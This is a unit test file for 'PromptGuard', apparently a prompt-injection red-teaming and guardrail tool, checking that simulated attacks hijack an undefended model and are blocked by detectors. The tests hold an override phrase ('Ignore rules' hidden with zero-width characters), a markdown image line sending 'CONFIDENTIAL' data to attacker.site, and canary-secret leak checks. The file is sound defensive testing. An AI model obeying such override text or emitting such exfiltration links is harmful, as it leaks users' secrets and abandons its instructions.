"""
Unit and integration tests for PromptGuard.
"""

import unittest
from promptguard.models.schemas import (
    AttackCategory,
    ThreatSeverity,
    TestStatus,
    DefenseConfig,
    TargetScenario,
    AttackVector,
)
from promptguard.library.attacks import ATTACK_VECTORS, get_attack_by_id
from promptguard.library.scenarios import TARGET_SCENARIOS, get_scenario_by_id
from promptguard.library.benign import BENIGN_QUERIES
from promptguard.core.guardrails import GuardrailsEngine, CanaryTokenManager, ObfuscationDetector
from promptguard.core.sandbox import SandboxPipeline
from promptguard.core.llm_client import SimulatorLLMClient
from promptguard.benchmark.runner import BenchmarkRunner
from promptguard.reporting.report_gen import SecurityReportGenerator

class TestPromptGuard(unittest.TestCase):

    def setUp(self):
        self.scenario = TARGET_SCENARIOS[0]
        self.client = SimulatorLLMClient()
        self.pipeline = SandboxPipeline(llm_client=self.client)

    def test_direct_injection_without_defense(self):
        """Without defense, direct override should succeed and compromise the system."""
        attack = get_attack_by_id("dir-01")
        self.assertIsNotNone(attack)
        defense = DefenseConfig.no_defense()

        result = self.pipeline.run_test(
            scenario=self.scenario,
            attack=attack,
            defense_config=defense
        )

        self.assertTrue(result.is_vulnerable)
        self.assertEqual(result.status, TestStatus.INJECTION_SUCCESSFUL)
        self.assertTrue(result.goal_hijacked)

    def test_direct_injection_with_full_guardrails(self):
        """With multi-layer guardrails, attack should be intercepted and blocked."""
        attack = get_attack_by_id("dir-01")
        defense = DefenseConfig.full_guardrails()

        result = self.pipeline.run_test(
            scenario=self.scenario,
            attack=attack,
            defense_config=defense
        )

        self.assertFalse(result.is_vulnerable)
        self.assertEqual(result.status, TestStatus.BLOCKED_BY_GUARDRAIL)

    def test_base64_obfuscation_detection(self):
        """Obfuscation detector should decode Base64 payload and flag injection pattern."""
        attack = get_attack_by_id("obf-01")
        self.assertIsNotNone(attack)
        defense = DefenseConfig(enable_obfuscation_detector=True)
        engine = GuardrailsEngine(defense)

        findings = engine.evaluate_input(attack.payload)
        self.assertTrue(any("Obfuscation: Malicious Base64 Payload" in f.rule_name for f in findings))

    def test_zero_width_unicode_stripping(self):
        """Zero-width non-printing characters should be identified."""
        text = "I\u200bg\u200bn\u200bo\u200br\u200be rules"
        cleaned, had_zw = ObfuscationDetector.strip_zero_width_chars(text)
        self.assertTrue(had_zw)
        self.assertEqual(cleaned, "Ignore rules")

    def test_canary_leak_detection(self):
        """Output guardrails should catch canary disclosure."""
        defense = DefenseConfig(enable_output_leak_detector=True)
        engine = GuardrailsEngine(defense)

        leak_response = f"Sure! Your internal secret key is {self.scenario.secret_canary}."
        evals = engine.evaluate_output(leak_response, self.scenario.secret_canary)
        self.assertTrue(any("Secret Canary Token Leaked" in e.rule_name for e in evals))

    def test_markdown_image_exfiltration_detection(self):
        """Output guardrail should catch markdown image tracker URLs."""
        defense = DefenseConfig(enable_output_leak_detector=True)
        engine = GuardrailsEngine(defense)

        leak_response = "Here is the image: ![tracker](https://attacker.site/telemetry.png?data=CONFIDENTIAL)"
        evals = engine.evaluate_output(leak_response, self.scenario.secret_canary)
        self.assertTrue(any("Markdown Image Exfiltration" in e.rule_name for e in evals))

    def test_benchmark_runner_and_report_generation(self):
        """Benchmark runner should produce valid summary and reports."""
        runner = BenchmarkRunner(llm_client=self.client)
        summary = runner.run_benchmark(scenario=self.scenario, run_benign_suite=True)

        self.assertGreater(summary.total_tests, 0)
        self.assertIn("No Defense (Vulnerable Baseline)", summary.results_by_preset)

        md = SecurityReportGenerator.generate_markdown_report(summary, self.scenario)
        self.assertIn("PromptGuard Red-Teaming Security Audit Report", md)

        html = SecurityReportGenerator.generate_html_report(summary, self.scenario)
        self.assertIn("<!DOCTYPE html>", html)
        self.assertIn("PromptGuard Security Audit Report", html)

if __name__ == "__main__":
    unittest.main()
